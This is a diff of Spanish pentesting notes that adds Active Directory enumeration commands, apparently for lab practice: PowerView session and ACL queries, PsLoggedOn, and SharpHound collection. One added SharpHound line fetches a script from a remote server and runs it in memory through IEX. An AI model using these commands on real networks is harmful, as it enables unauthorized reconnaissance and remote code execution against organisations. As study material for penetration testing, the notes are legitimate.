@@ -177,9 +177,29 @@ Hay más información sobre algunos comandos de PowerView [[PowerView| aquí]]. 
 	```powershell
 	Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
 	```
-	Para explotar esto, una
+- Mostrar usuarios logueados en equipos
+	```powerview
+	Get-NetSession -ComputerName files04 -Verbose
+	```
+- Mostrar algunas ACL interesantes (por ej: del grupo `Management Department`)
+	```powershell
+	# objetos con generic all
+	Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+	# obbjetos con permisos inseguros
+	Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -match "Write|GenericAll|Owner|DACL"} | select SecurityIdentifier,ActiveDirectoryRights
+	```
+- Comprobar equipos que tienen acceso por rdp:
+	```powershell
+	Get-NetComputer -FullData | Where-Object { $_.operatingsystem -match "Windows" -and $_.name -notmatch "DC" } | Select-Object name, dnshostname
+	```
+
+### PsLoggedOn
+Muestra todos los usuarios logueados en los equipos sobre los que queramos. A diferencia de `Get-NetSession` de powershell, muestra usuarios logueados en otros protocolos además de `SMB`  (rdp, consola, servicios)
+```powershell
+.\PsLoggedon.exe \\client74
+```
 ### Sharpview
-Es la versión .NET d `powerView`. Puede ser útil cuando hay medidas de hardening sobre un entorno powershell
+Es la versión .NET  `powerView`. Puede ser útil cuando hay medidas de hardening sobre un entorno powershell
 ### Snaffler
 Es una herramienta que nos puede ayudar a recolectar información sensible dentro del AD como credenciales, archivos de configuración, claves SSH, … Ejemplo de ejecución:
 ```powershell
@@ -188,6 +208,14 @@ Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 ### Sharphound
 Similar a `bloodhound-python`, aunque permite obtener información de sesiones, ACLs, grupos locales y rutas de confianza, ya además de actúar sobre el protocolo LDAP, también actúa sobre kerberos, WinRM y SMB
 ```powershell
+#Ejecutable
 .\SharpHound.exe -c All --zipfilename ILFREIGHT
 .\SharpHound.exe -c all, Group --zipfilename sharphound_inlane
+# Sharphound.ps1
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\public\ -OutputPrefix "corp audit"
+# Sin importar script
+.\SharpHound.ps1 -c All,Group -ZipFileName sharphound_inlane
+# Fileless
+IEX (New-Object Net.WebClient).DownloadString('http://servidor/sharphound.ps1'); Invoke-BloodHound -CollectionMethod All,Group -ZipFileName sharphound_inlane
 ```
